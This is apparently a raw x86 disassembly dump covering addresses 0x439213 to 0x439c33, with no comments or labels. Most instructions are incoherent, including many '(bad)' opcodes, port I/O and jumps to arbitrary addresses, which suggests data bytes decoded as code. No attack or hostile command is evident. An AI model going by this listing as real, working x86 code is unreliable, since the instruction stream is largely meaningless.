  439213:	cmp    BYTE PTR [eax+0x13],ch
  439216:	clc    
  439217:	sahf   
  439218:	sbb    ecx,DWORD PTR [eax+0x14]
  43921b:	sub    DWORD PTR [ecx],ecx
  43921d:	xchg   edi,eax
  43921e:	je     0x439201
  439220:	mov    ds:0xe386d41b,eax
  439225:	stos   DWORD PTR es:[edi],eax
  439226:	out    0xfe,eax
  439228:	pop    ebp
  439229:	xchg   esi,eax
  43922a:	cli    
  43922b:	bound  ebp,QWORD PTR [ebx]
  43922d:	mov    al,ds:0x96992488
  439232:	je     0x439279
  439234:	test   eax,0x5ef814
	...
  439255:	add    al,bl
  439257:	xchg   esi,eax
  439258:	je     0x43929f
  43925a:	test   eax,0x4ef9dbf4
  43925f:	add    bl,bh
  439261:	add    BYTE PTR [ecx-0xbea0a9b],dl
  439267:	in     al,dx
  439268:	aas    
  439269:	add    BYTE PTR [ebx-0x2b3fec9c],ah
  43926f:	cmp    eax,0xc9c93900
  439274:	outs   dx,BYTE PTR ds:[esi]
  439275:	and    BYTE PTR [ebp+ebp*2+0x6e],bh
  439279:	inc    eax
  43927a:	mov    ah,0x64
  43927c:	jae    0x439252
  43927e:	or     ecx,DWORD PTR [edx]
  439280:	test   al,0x12
  439282:	fs std 
  439284:	xor    al,bl
  439286:	add    BYTE PTR [edx+0x641c75f5],bl
  43928c:	retf   0x1ff
  43928f:	leave  
  439290:	cmc    
  439291:	adc    eax,0x3a92ac
  439296:	fild   WORD PTR [esi-0x18]
  439299:	pop    edi
  43929a:	sbb    bl,cl
  43929c:	enter  0x70c2,0xfd
  4392a0:	dec    ebp
  4392a1:	mov    edx,DWORD PTR [ebp+0x3400096c]
  4392a7:	std    
  4392a8:	in     eax,dx
  4392a9:	inc    esp
  4392aa:	adc    BYTE PTR [ecx+eax*1],cl
  4392ad:	je     0x4392e1
  4392af:	xlat   BYTE PTR ds:[ebx]
  4392b0:	out    0xbc,eax
  4392b2:	jl     0x439311
  4392b4:	cmc    
  4392b5:	mov    esi,DWORD PTR [edx+0x3e]
  4392b8:	mov    edx,0x4
	...
  4392d5:	add    BYTE PTR [eax],al
  4392d7:	add    BYTE PTR [edx+ecx*4],dh
  4392da:	inc    eax
  4392db:	or     BYTE PTR [ebx+0x6],dh
  4392de:	in     al,dx
  4392df:	mov    esp,fs
  4392e1:	add    eax,DWORD PTR [ebp-0x7cf4ff40]
  4392e7:	or     BYTE PTR [ebx*2-0x1998f7b1],ah
  4392ee:	pop    es
  4392ef:	add    BYTE PTR [ebx-0xa],ch
  4392f2:	or     edi,edi
  4392f4:	loope  0x4392ae
  4392f6:	or     DWORD PTR [eax+0xd],eax
  4392f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4392fa:	mov    ecx,ecx
  4392fc:	in     al,0x14
  4392fe:	xchg   ebx,eax
  4392ff:	cli    
  439300:	sar    BYTE PTR [ebx-0x77],cl
  439303:	jmp    0x439361
  439305:	jno    0x4392d8
  439307:	icebp  
  439308:	pop    ebx
  439309:	jns    0x439343
  43930b:	pushw  cs
  43930d:	jno    0x439347
  43930f:	push   edx
  439310:	daa    
  439311:	loop   0x439348
  439313:	sti    
  439314:	add    BYTE PTR [edi],dl
  439316:	idiv   BYTE PTR [edi]
  439318:	or     eax,0x673c8ae
  43931d:	int3   
  43931e:	sti    
  43931f:	add    BYTE PTR [edi+eiz*1],cl
  439322:	sbb    BYTE PTR [edi+edi*1],al
  439325:	out    0xaa,eax
  439327:	xor    ebx,edx
  439329:	jle    0x4392b9
  43932b:	adc    cl,ch
  43932d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43932e:	rcl    BYTE PTR es:0x83e803e7,0xb5
  439336:	popf   
  439337:	cli    
  439338:	xchg   esi,eax
  439339:	scas   al,BYTE PTR es:[edi]
  43933a:	fyl2xp1 
	...
  439358:	add    BYTE PTR [eax],al
  43935a:	loopne 0x4392fe
  43935c:	aam    0xbf
  43935e:	data16 lahf 
  439360:	xor    ebx,edi
  439362:	shr    BYTE PTR [edx-0x4a36eb63],0x3e
  439369:	add    BYTE PTR [esi-0x9fd7692],al
  43936f:	rcl    BYTE PTR [edi],0xd
  439372:	ret    0x2e79
  439375:	or     bh,bl
  439377:	cmp    WORD PTR [ebx-0x45],bx
  43937b:	pop    edi
  43937c:	les    eax,FWORD PTR [edi]
  43937e:	or     eax,0x5cfc5014
  439383:	out    dx,eax
  439384:	xor    eax,0x35f75b52
  439389:	dec    edi
  43938a:	bound  esp,QWORD PTR [esi]
  43938c:	das    
  43938d:	or     al,0x84
  43938f:	add    BYTE PTR [edi+ecx*1-0x5d4e006e],ch
  439396:	push   edx
  439397:	or     BYTE PTR [esi-0xa2bfe5e],dh
  43939d:	inc    ebx
  43939e:	or     eax,0x400fbbd9
  4393a3:	mov    bl,0xff
  4393a5:	sbb    cl,al
  4393a7:	or     al,0x23
  4393a9:	cmp    DWORD PTR [edi+0x2a],ebx
  4393ac:	out    0x2d,al
  4393ae:	mov    dl,0x2d
  4393b0:	mov    ebx,0x9397132d
  4393b5:	lahf   
  4393b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4393b7:	in     eax,dx
  4393b8:	pusha  
  4393b9:	stc    
  4393ba:	(bad)  
  4393bc:	arpl   bx,ax
	...
  4393da:	add    BYTE PTR [eax],al
  4393dc:	mov    edi,DWORD PTR ds:0x8b151705
  4393e2:	lock xor eax,DWORD PTR [esi-0x59511ecf]
  4393e9:	mov    ebx,DWORD PTR [ebx-0xebe7bf5]
  4393ef:	push   ebx
  4393f0:	or     eax,0x8a3784ab
  4393f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4393f6:	gs mov al,0xa
  4393f9:	mov    esi,0x7d0da223
  4393fe:	test   al,0x18
  439400:	(bad)  
  439401:	xor    dl,BYTE PTR [ebx]
  439403:	cmp    DWORD PTR [eax-0x2e751ee7],edx
  439409:	mov    ebx,DWORD PTR [ebp+0x9]
  43940c:	test   BYTE PTR ds:0xc6a8799,bh
  439412:	pop    es
  439413:	lea    ebx,[edi-0x48a61e69]
  439419:	sti    
  43941a:	pop    ebp
  43941b:	retf   0x3d4c
  43941e:	add    BYTE PTR [esi*8+0xd03f0d5],0x83
  439426:	push   DWORD PTR [eax+0xf]
  439429:	es inc ebx
  43942b:	pop    esp
  43942c:	dec    edx
  43942d:	cwde   
  43942e:	dec    edi
  43942f:	ror    DWORD PTR [esi+0x1e],cl
  439432:	sbb    dh,BYTE PTR [edi-0x30564d0]
  439438:	ss lock aas 
  43943b:	jmp    0xfbb6eacb
	...
  43945c:	add    BYTE PTR [eax],al
  43945e:	clc    
  43945f:	(bad)  
  439460:	jle    0x43948c
  439462:	mov    al,ds:0x9ebcfb45
  439467:	xor    BYTE PTR [esi+0x2e],ah
  43946a:	ins    BYTE PTR es:[edi],dx
  43946b:	jmp    0x4394d8
  43946d:	sti    
  43946e:	dec    esi
  43946f:	add    BYTE PTR [ebp-0x3e03fad7],al
  439475:	lods   al,BYTE PTR ds:[esi]
  439476:	ins    DWORD PTR es:[edi],dx
  439477:	dec    DWORD PTR [esp+eiz*4+0x7cfb4676]
  43947e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43947f:	sbb    al,0x1a
  439481:	xchg   edi,eax
  439482:	xor    BYTE PTR [ebx-0x10292306],bl
  439488:	aas    
  439489:	jmp    0xea3ea81c
  43948e:	add    edi,esp
  439490:	shl    DWORD PTR [edi+ebp*4],0x96
  439494:	jge    0x439444
  439496:	pop    esi
  439497:	cdq    
  439498:	dec    esp
  439499:	aad    0xfb
  43949b:	test   BYTE PTR [edx+0x27],bl
  43949e:	or     BYTE PTR [esi+0x44],bh
  4394a1:	mov    edi,0x1e515557
  4394a6:	mov    BYTE PTR [esi+eax*4+0x340381b8],cl
  4394ad:	(bad)  
  4394ae:	sar    edi,1
  4394b0:	push   edx
  4394b1:	aaa    
  4394b2:	jno    0x43947e
  4394b4:	sbb    edx,DWORD PTR [edi-0x2f371a93]
  4394ba:	mov    edi,0x3700d9d6
  4394bf:	cld    
  4394c0:	je     0x4394c8
	...
  4394de:	add    BYTE PTR [eax],al
  4394e0:	jge    0x43951c
  4394e2:	cmp    ebx,esi
  4394e4:	daa    
  4394e5:	cld    
  4394e6:	jp     0x4394a9
  4394e8:	call   0xc65c8c69
  4394ed:	arpl   WORD PTR [ebp+0x5e],dx
  4394f0:	aaa    
  4394f1:	into   
  4394f2:	sub    ah,0x95
  4394f5:	int3   
  4394f6:	dec    ebp
  4394f7:	mov    edi,DWORD PTR [ecx-0x3824d4fb]
  4394fd:	retf   0xf331
  439500:	jp     0x43949b
  439502:	add    DWORD PTR [ebp-0x54],0xbd0cba7c
  439509:	fpatan 
  43950b:	je     0x43948e
  43950d:	mov    dl,BYTE PTR [edx-0x4]
  439510:	sbb    al,0x99
  439512:	aas    
  439513:	and    esp,0xffffff90
  439516:	xor    esi,ecx
  439518:	jbe    0x439569
  43951a:	add    esi,0x5719c19f
  439520:	sahf   
  439521:	inc    ecx
  439522:	push   0x1b400
  439527:	push   eax
  439528:	xchg   edi,eax
  439529:	jecxz  0x439521
  43952b:	jmp    FWORD PTR [ecx-0x13]
  43952e:	or     DWORD PTR [eax+0x74],eax
  439531:	mov    dh,dl
  439533:	cmp    edi,DWORD PTR [edi]
  439535:	clc    
  439536:	inc    esi
  439537:	mov    DWORD PTR [ecx],esp
  439539:	pusha  
  43953a:	xor    ebx,esi
  43953c:	or     ch,BYTE PTR [ecx+eax*4-0x3f7dc38b]
  439543:	or     BYTE PTR [eax],al
	...
  439561:	add    BYTE PTR [edi-0x4c97082b],ch
  439567:	xor    bh,BYTE PTR ds:0x7074eb00
  43956d:	cld    
  43956e:	jl     0x43957b
  439570:	(bad)  
  439571:	dec    DWORD PTR ds:0x99bf87a7
  439577:	mov    ecx,DWORD PTR [ebx-0x6580f1c7]
  43957d:	inc    esp
  43957e:	add    DWORD PTR [edi],ecx
  439580:	inc    edx
  439581:	add    al,0x86
  439583:	jecxz  0x439524
  439585:	jle    0x439552
  439587:	mov    dh,0xd5
  439589:	inc    esp
  43958a:	sbb    DWORD PTR [ecx-0x5cb7794c],edi
  439590:	fild   DWORD PTR [ecx+ebx*8-0x4d]
  439594:	push   es
  439595:	mov    al,0xc
  439597:	inc    edx
  439598:	or     ch,BYTE PTR [esi]
  43959a:	int    0x31
  43959c:	pop    es
  43959d:	xchg   DWORD PTR [eax-0x71],edx
  4395a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4395a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4395a2:	mov    ebx,0xcd2d9acd
  4395a7:	test   DWORD PTR [edi+edx*2],edi
  4395aa:	aam    0xe8
  4395ac:	or     eax,DWORD PTR [eax]
  4395ae:	ins    BYTE PTR es:[edi],dx
  4395af:	pop    edx
  4395b0:	mov    esp,0xc4240d3e
  4395b5:	jae    0x4395b8
  4395b7:	fimul  WORD PTR [eax]
  4395b9:	test   BYTE PTR [esi+0x69],cl
  4395bc:	(bad)  
  4395bd:	(bad)  
  4395be:	inc    esp
  4395bf:	push   0x480ae6fe
  4395c4:	inc    esp
  4395c5:	fiadd  DWORD PTR [eax]
	...
  4395e3:	add    dh,cl
  4395e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4395e6:	rol    DWORD PTR [ecx+edx*4],0x69
  4395ea:	cmp    eax,0x44e02900
  4395ef:	add    BYTE PTR [esi+0xd3ebe26],ch
  4395f5:	mov    BYTE PTR [esi],ch
  4395f7:	fcmove st,st(6)
  4395f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4395fa:	pop    ebp
  4395fb:	(bad)  
  4395fc:	dec    esi
  4395fd:	jmp    0xb3c93705
  439602:	add    BYTE PTR ds:[esi-0x7a],ch
  439606:	mov    ebp,0x48000d3e
  43960b:	push   ebx
  43960c:	stc    
  43960d:	aas    
  43960e:	jmp    0x26040075
  439613:	add    al,0x6c
  439615:	pop    edi
  439616:	repz inc ebx
  439618:	or     eax,0x43c2a85f
  43961d:	add    BYTE PTR [eax+0x67],cl
  439620:	and    DWORD PTR [eax-0x17],eax
  439623:	(bad)
  439628:	lods   al,BYTE PTR ds:[esi]
  439629:	push   0x5f0d43fb
  43962e:	dec    eax
  43962f:	ret    0x1b
  439632:	mov    BYTE PTR [ebx-0x7],dh
  439635:	aas    
  439636:	jmp    0xa603509d
  43963b:	add    ebp,DWORD PTR [esp+ebp*2-0x2d]
  43963f:	inc    ebx
  439640:	or     eax,0xf3c7e85f
  439645:	inc    DWORD PTR [edi+0x7b]
	...
  439663:	add    BYTE PTR [eax],al
  439665:	add    BYTE PTR [ecx],al
  439667:	inc    eax
  439668:	jmp    0xa5ffa8cf
  43966d:	add    ebp,DWORD PTR [eax+eax*8-0x5]
  439671:	inc    ebx
  439672:	or     eax,0x4bc7c85f
  439677:	add    BYTE PTR [eax-0x7d],cl
  43967a:	sbb    DWORD PTR [eax-0x17],eax
  43967d:	bound  ebp,QWORD PTR [edx]
  43967f:	mov    esp,0x74ac03a5
  439684:	rol    DWORD PTR [ebx+0xd],cl
  439687:	pop    edi
  439688:	sub    al,cl
  43968a:	and    eax,DWORD PTR [eax]
  43968c:	mov    BYTE PTR [eax+0x60e94001],dl
  439692:	ret    0x25bb
  439695:	add    al,0x6c
  439697:	int3   
  439698:	fiadd  DWORD PTR [ebx+0xd]
  43969b:	pop    edi
  43969c:	dec    eax
  43969d:	enter  0xfffb,0xff
  4396a1:	xchg   DWORD PTR [ecx-0xf],edx
  4396a4:	aas    
  4396a5:	jmp    0x2b07b957
  4396aa:	or     DWORD PTR [ecx-0xd],esp
  4396ad:	hlt    
  4396ae:	into   
  4396af:	call   FWORD PTR [esi-0x2dba97]
  4396b5:	inc    edi
  4396b6:	icebp  
  4396b7:	lock aas 
  4396b9:	jmp    0x2b071a2b
  4396be:	adc    DWORD PTR [ecx-0x11],esp
  4396c1:	fmul   QWORD PTR [esi+0x0]
  4396c4:	lahf   
  4396c5:	dec    ecx
  4396c6:	aad    0xd1
  4396c8:	inc    DWORD PTR [edi+0x0]
	...
  4396e6:	add    BYTE PTR [eax],al
  4396e8:	(bad)
  4396eb:	jmp    0xab06fa5d
  4396f0:	push   cs
  4396f1:	popa   
  4396f2:	addr16 cmc 
  4396f4:	dec    esi
  4396f5:	add    BYTE PTR [edi-0x2e2ad7],bl
  4396fb:	xchg   DWORD PTR [ecx],ecx
  4396fd:	in     al,dx
  4396fe:	aas    
  4396ff:	jmp    0xab075a31
  439704:	push   cs
  439705:	popa   
  439706:	cmp    edi,esp
  439708:	dec    esi
  439709:	add    BYTE PTR [edi-0x2e3af7],bl
  43970f:	inc    edi
  439710:	popf   
  439711:	jmp    0x439752
  439713:	jmp    0xab073a05
  439718:	push   cs
  439719:	popa   
  43971a:	arpl   bp,dx
  43971c:	into   
  43971d:	call   FWORD PTR [esi-0x2eb417]
  439723:	inc    edi
  439724:	and    esp,ebp
  439726:	aas    
  439727:	jmp    0x2b089a19
  43972c:	adc    DWORD PTR [ecx+0x2f],esp
  43972f:	cld    
  439730:	into   
  439731:	call   FWORD PTR [esi-0x2eadf7]
  439737:	call   DWORD PTR [ebp+0x2440153e]
  43973d:	pop    ds
  43973e:	sub    eax,ebp
  439740:	out    0xfb,eax
  439742:	mov    al,ds:0x3e4060
  439747:	mov    ds:0x39baf4,eax
	...
  439768:	add    BYTE PTR [eax],al
  43976a:	(bad)
  43976d:	inc    eax
  43976e:	and    al,0x1f
  439770:	dec    ebx
  439771:	lds    esi,FWORD PTR [edi]
  439773:	cld    
  439774:	mov    al,ds:0x3de058
  439779:	mov    ds:0x39b904,eax
  43977e:	inc    ebp
  43977f:	rcl    DWORD PTR [ebx],1
  439781:	inc    eax
  439782:	hlt    
  439783:	and    BYTE PTR [ebx-0x3b],ch
  439786:	mov    bh,0xfd
  439788:	mov    al,ds:0x3de04c
  43978d:	mov    ds:0x39ba64,eax
  439792:	xchg   ebp,eax
  439793:	mov    ch,0x13
  439795:	inc    eax
  439796:	mov    ah,0x20
  439798:	mov    eax,ebp
  43979a:	addr16 std 
  43979c:	mov    al,ds:0x3dd128
  4397a1:	mov    ds:0x39ba94,eax
  4397a6:	push   ebp
  4397a7:	cdq    
  4397a8:	push   cs
  4397a9:	inc    eax
  4397aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4397ab:	and    BYTE PTR [ebx-0x5f02983b],ch
  4397b1:	cmp    BYTE PTR [eax+0x34a3003d],al
  4397b7:	mov    edx,0x94c50039
  4397bc:	push   cs
  4397bd:	inc    eax
  4397be:	fs and bl,cl
  4397c1:	lds    esi,FWORD PTR [edi+0x6108a0fd]
  4397c7:	cmp    eax,0xbf44a300
  4397cc:	cmp    DWORD PTR [eax],eax
	...
  4397ea:	add    BYTE PTR [eax],al
  4397ec:	or     eax,0xcd13d388
  4397f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4397f2:	popa   
  4397f3:	out    dx,eax
  4397f4:	dec    eax
  4397f5:	out    0x3,al
  4397f7:	mov    eax,ds:0x3eac1d
  4397fc:	outs   dx,BYTE PTR ds:[esi]
  4397fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4397fe:	sar    BYTE PTR [esi],0xd
  439801:	mov    bl,ah
  439803:	adc    ecx,ebp
  439805:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439806:	popa   
  439807:	rcpps  xmm4,xmm6
  43980a:	add    esp,DWORD PTR [ecx+0x3e937d]
  439810:	scas   al,BYTE PTR es:[edi]
  439811:	mov    al,0x3e
  439814:	or     eax,0x4d139448
  439819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43981a:	popa   
  43981b:	das    
  43981c:	retf   
  43981d:	in     eax,0x3
  43981f:	mov    eax,ds:0x3eaac9
  439824:	scas   al,BYTE PTR es:[edi]
  439825:	data16 sar BYTE PTR [esi],0xd
  439829:	mov    BYTE PTR [ebx],al
  43982b:	adc    al,0x4d
  43982d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43982e:	popa   
  43982f:	dec    edi
  439830:	shl    DWORD PTR [ebp-0x2],cl
  439833:	mov    al,ds:0x3eb5b5
  439838:	outs   dx,BYTE PTR ds:[esi]
  439839:	mov    al,0x3e
  43983c:	or     eax,0x4d139f88
  439841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439842:	popa   
  439843:	outs   dx,DWORD PTR ds:[esi]
  439844:	retf   
  439845:	gs (bad) 
  439847:	mov    al,ds:0x3e9599
  43984c:	outs   dx,BYTE PTR ds:[esi]
  43984d:	es mov esi,0x3e
	...
  43986b:	add    BYTE PTR [eax],al
  43986d:	add    BYTE PTR ds:0xcd0ea048,cl
  439873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439874:	popa   
  439875:	(bad)  
  439876:	push   ebx
  439877:	gs (bad) 
  439879:	mov    al,ds:0x3eb551
  43987e:	scas   al,BYTE PTR es:[edi]
  43987f:	inc    esi
  439880:	mov    esi,0x88000d3e
  439885:	addr16 (bad) 
  439887:	aas    
  439888:	jmp    0x25fd3af3
  43988d:	add    al,0x6c
  43988f:	stos   DWORD PTR es:[edi],eax
  439890:	hlt    
  439891:	inc    ebx
  439892:	or     eax,0xfbc1a85d
  439897:	inc    DWORD PTR [edi-0x16bfe1ad]
  43989d:	pop    dx
  43989f:	mov    ecx,0x6b6c0425
  4398a4:	cld    
  4398a5:	inc    ebx
  4398a6:	or     eax,0xd3c1885d
  4398ab:	inc    DWORD PTR [edi+0x6f]
  4398ae:	sbb    al,BYTE PTR [eax-0x17]
  4398b1:	sub    eax,0xc6691845
  4398b6:	cmp    eax,DWORD PTR [eax]
  4398b8:	inc    esi
  4398b9:	xchg   ebx,eax
  4398ba:	int3   
  4398bb:	inc    ebx
  4398bc:	jmp    0x69d0a86c
  4398c1:	call   0x5821:0x8ebb33a3
  4398c8:	test   BYTE PTR [ebx+0xd],0x18
  4398cc:	pop    ecx
  4398cd:	xchg   DWORD PTR [edx],ecx
  4398cf:	add    BYTE PTR [edx+0x9a],dh
	...
  4398ed:	add    BYTE PTR [eax],al
  4398ef:	add    ah,bl
  4398f1:	sbb    ch,ch
  4398f3:	mov    dl,bh
  4398f5:	call   DWORD PTR [ecx-0x5a394d9a]
  4398fb:	add    esp,DWORD PTR [esi-0x6e0c3f4a]
  439901:	inc    eax
  439902:	jmp    0x22341339
  439907:	inc    esi
  439908:	or     eax,0x252b3a8f
  43990d:	jge    0x4398b7
  43990f:	add    ebx,esi
  439911:	(bad)  
  439912:	enter  0x3bc2,0x0
  439916:	cli    
  439917:	mov    al,0xea
  439919:	(bad)  
  43991b:	arpl   si,cx
  43991d:	call   DWORD PTR [edx+0x4a]
  439920:	ds ret 0xe93e
  439924:	jne    0x4398d7
  439926:	gs in  al,0x26
  439929:	add    bl,al
  43992b:	sub    dl,BYTE PTR [ecx]
  43992d:	outs   dx,DWORD PTR ds:[esi]
  43992e:	aas    
  43992f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439930:	enter  0xe7ff,0x78
  439934:	xchg   ebp,eax
  439935:	mov    bh,dl
  439937:	jae    0x4399aa
  439939:	adc    esi,0x3d
  43993c:	dec    edx
  43993d:	mov    dh,BYTE PTR [ecx+eiz*1]
  439940:	dec    esp
  439941:	into   
  439942:	push   DWORD PTR [ecx+0x4c]
  439945:	mov    dh,BYTE PTR [ecx+eiz*8]
  439948:	dec    ebp
  439949:	into   
  43994a:	call   DWORD PTR [ebp+0x2ac2e6da]
  439950:	or     DWORD PTR [ebx+0xe134],ecx
	...
  439972:	int    0xcd
  439974:	(bad)  
  439975:	jge    0x439939
  439977:	push   es
  439978:	ret    
  439979:	sub    dl,BYTE PTR [ecx]
  43997b:	cwde   
  43997c:	sbb    eax,0x598985ba
  439981:	jae    0x439953
  439983:	xor    eax,0x12c664bf
  439988:	adc    al,0x6a
  43998a:	and    eax,0x12e903e4
  43998f:	std    
  439990:	cli    
  439991:	mov    ebp,0x3e5102da
  439996:	mov    ds:0xea90f12,al
  43999b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43999c:	adc    bh,dl
  43999e:	pop    eax
  43999f:	test   eax,eax
  4399a1:	rcr    dl,cl
  4399a3:	jecxz  0x4399a8
  4399a5:	fs (bad) 
  4399a7:	stc    
  4399a8:	xchg   esp,eax
  4399a9:	sub    ebx,DWORD PTR [esi+esi*4+0x328a2916]
  4399b0:	push   cs
  4399b1:	add    BYTE PTR [ebx],dl
  4399b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4399b4:	mov    esp,0x850268c2
  4399b9:	leave  
  4399ba:	call   0x48c0135d
  4399bf:	mov    ?,edx
  4399c1:	jae    0x439a24
  4399c3:	outs   dx,BYTE PTR ds:[si]
  4399c5:	and    al,0x68
  4399c7:	shl    esi,1
  4399c9:	adc    eax,0x3a918c
  4399ce:	dec    edi
  4399cf:	(bad)
  4399d3:	shl    DWORD PTR [ecx],0x44
	...
  4399f2:	add    BYTE PTR [eax],al
  4399f4:	or     BYTE PTR [eax],al
  4399f6:	test   ecx,ecx
  4399f8:	xor    ebx,DWORD PTR ds:0x8b7cf7bd
  4399fe:	mov    edx,0xf595d88d
  439a03:	and    esp,DWORD PTR [esi-0x3c]
  439a06:	(bad)  
  439a07:	dec    DWORD PTR [ecx+0x7b]
  439a0a:	out    0x83,al
  439a0c:	sub    BYTE PTR [ebp+0x4b8cbe50],0x39
  439a13:	add    BYTE PTR [edx],bl
  439a15:	mov    edi,0x447ef803
  439a1a:	add    BYTE PTR [esi*8-0x2600ffff],bl
  439a21:	and    eax,0xee44010
  439a26:	mov    ebx,0x105380f
  439a2b:	add    BYTE PTR [ebx+ebx*8+0x50d58f9],dh
  439a32:	or     bl,bl
  439a34:	add    DWORD PTR [bx],eax
  439a37:	test   ecx,esp
  439a39:	add    BYTE PTR [eax],al
  439a3b:	add    BYTE PTR [ebx+edx*4-0x4b5bbc2a],dl
  439a42:	int3   
  439a43:	cmp    al,0xa5
  439a45:	dec    BYTE PTR [ecx-0x5f]
  439a48:	or     eax,0xd3ebcf3
  439a4d:	sbb    dl,BYTE PTR [edi+0x5dba0004]
  439a53:	call   DWORD PTR [edi+0x5a]
  439a56:	(bad)  
  439a57:	add    BYTE PTR ss:[eax],al
	...
  439a76:	dec    edi
  439a77:	or     al,0x6
  439a79:	ret    0x8708
  439a7c:	mov    ebx,0xa5980d3e
  439a81:	jnp    0x439a11
  439a83:	lahf   
  439a84:	add    al,0x74
  439a86:	adc    edx,esi
  439a88:	les    esi,FWORD PTR [esi+edi*4+0x1e]
  439a8c:	or     eax,esi
  439a8e:	push   edi
  439a8f:	fiadd  DWORD PTR [ebx]
  439a91:	out    0xa6,eax
  439a93:	sbb    DWORD PTR [ecx+eax*1-0x9ac360],ebx
  439a9a:	inc    edi
  439a9b:	fiadd  DWORD PTR [ebx]
  439a9d:	aaa    
  439a9e:	dec    edi
  439a9f:	in     al,dx
  439aa0:	or     al,0xc2
  439aa2:	or     BYTE PTR [edi-0x4b],ah
  439aa5:	ds or  eax,0x8e53a59b
  439aab:	outs   dx,BYTE PTR ds:[esi]
  439aac:	add    al,0x75
  439aae:	dec    edx
  439aaf:	pop    ebp
  439ab0:	add    al,dh
  439ab2:	xlat   BYTE PTR ds:[ebx]
  439ab3:	fld    DWORD PTR [ebx]
  439ab5:	add    dh,dh
  439ab7:	(bad)  
  439ab9:	rcr    BYTE PTR [ecx-0x5d],0xd2
  439abd:	(bad)  
  439abe:	popa   
  439abf:	in     eax,0x64
  439ac1:	sti    
  439ac2:	mov    bh,0x59
  439ac4:	(bad)  
  439ac5:	jle    0x439a8c
  439ac7:	fwait
  439ac8:	movups XMMWORD PTR [esp+ebp*4],xmm0
  439acc:	(bad)  
  439acd:	(bad)  
  439ace:	dec    esi
  439acf:	xchg   edi,eax
  439ad0:	cvttps2pi mm1,xmm3
  439ad3:	mov    ds:0x974ed58e,eax
  439ad8:	std    
  439ad9:	out    0x0,al
	...
  439af7:	add    dh,ch
  439af9:	sbb    DWORD PTR [ecx+eax*1+0x65030020],ebx
  439b00:	xchg   edx,eax
  439b01:	test   eax,0xc24203a5
  439b06:	fwait
  439b07:	or     al,0x4f
  439b09:	add    bl,BYTE PTR [ecx]
  439b0b:	mov    edx,0xaaec003b
  439b10:	push   es
  439b11:	add    DWORD PTR [eax],0x2b04e005
  439b17:	add    DWORD PTR [ebp-0x57],ebx
  439b1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439b1b:	add    ecx,DWORD PTR [esi]
  439b1d:	pop    edi
  439b1e:	in     al,dx
  439b1f:	mov    edx,0x96a00013
  439b24:	inc    edi
  439b25:	(bad)  
  439b26:	call   0xa02be605
  439b2b:	mov    ds,WORD PTR [ebp-0x20]
  439b2e:	mov    al,0x5b
  439b30:	aaa    
  439b31:	(bad)  
  439b32:	call   0xe3ba4a3a
  439b37:	xchg   ecx,eax
  439b38:	cmp    BYTE PTR [eax-0x17],al
  439b3b:	sbb    eax,0xb7f502d4
  439b40:	sar    edi,cl
  439b42:	adc    ecx,esi
  439b44:	ins    BYTE PTR es:[edi],dx
  439b45:	leave  
  439b46:	sti    
  439b47:	add    eax,0x10e93fe1
  439b4c:	or     DWORD PTR [eax-0xc],esp
  439b4f:	mov    bh,0x33
  439b51:	add    BYTE PTR [edi-0x71],al
  439b54:	sar    BYTE PTR [edi],0xe9
  439b57:	stos   BYTE PTR es:[edi],al
  439b58:	or     al,0x78
  439b5a:	ror    DWORD PTR [edi+0x0],cl
	...
  439b78:	add    BYTE PTR [eax],al
  439b7a:	sar    BYTE PTR [edi],0xe9
  439b7d:	mov    BYTE PTR [ecx-0x54],cl
  439b80:	mov    eax,0xf68c2196
  439b85:	inc    ebx
  439b86:	or     eax,0xd9405e22
  439b8b:	and    al,BYTE PTR [esi-0x16c02773]
  439b91:	push   ebx
  439b92:	or     eax,0xbff9ff97
  439b97:	mov    ebp,0xebe6292e
  439b9c:	add    cl,ch
  439b9e:	push   cs
  439b9f:	push   ds
  439ba0:	lahf   
  439ba1:	sbb    eax,esp
  439ba3:	retf   0xbaff
  439ba6:	out    0x85,al
  439ba8:	cli    
  439ba9:	jmp    0xdccbc9bc
  439bae:	sahf   
  439baf:	mov    ch,0x3e
  439bb1:	jmp    0x1437904c
  439bb6:	iret   
  439bb7:	jmp    DWORD PTR [ecx+0x4a]
  439bba:	mov    BYTE PTR [ebp-0xb8616c2],dh
  439bc0:	dec    edi
  439bc1:	test   esi,0x15ad7eff
  439bc7:	fidivr DWORD PTR [edi+0x7f4a462f]
  439bcd:	add    al,0x91
  439bcf:	lods   al,BYTE PTR ds:[esi]
  439bd0:	ds jmp 0x1f78b0e4
  439bd6:	mov    ebx,0x112ada02
  439bdb:	cs sti 
  439bdd:	cld    
	...
  439bfa:	add    BYTE PTR [eax],al
  439bfc:	push   ss
  439bfd:	std    
  439bfe:	aas    
  439bff:	jmp    0xb53b6792
  439c04:	dec    esp
  439c05:	add    BYTE PTR [eax],al
  439c07:	adc    al,0xe8
  439c09:	mov    ds:0x85988774,al
  439c0e:	sub    DWORD PTR [ecx-0x33810a03],0x7a
  439c15:	stos   DWORD PTR es:[edi],eax
  439c16:	ds jmp 0x61485a2a
  439c1c:	call   0x1486:0xf8e7ffc9
  439c23:	cmc    
  439c24:	mov    esp,0x2eaeffca
  439c29:	fwait
  439c2a:	aad    0x0
  439c2c:	addr16 (bad) 
  439c2e:	mov    edx,0xdb66a980
  439c33:	inc    ebx
